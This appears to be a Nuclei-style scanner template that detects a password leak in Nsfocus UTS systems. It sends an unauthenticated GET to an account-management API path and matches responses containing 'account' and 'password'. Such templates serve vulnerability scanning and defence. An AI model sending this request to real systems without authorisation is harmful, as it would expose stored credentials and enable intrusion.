id: poc-yaml-nsfocus-uts-password-leak
info:
  name: Nsfocus Uts Password Leak
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak
  description: |
    This template identifies password leaks in Nsfocus Uts systems by checking for specific JSON response attributes indicating potential exposure.
http:
  - method: GET
    path:
      - "/webapi/v1/system/accountmanage/account"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "content-type: application/json"
      - type: word
        part: body
        words:
          - "account"
          - "password"
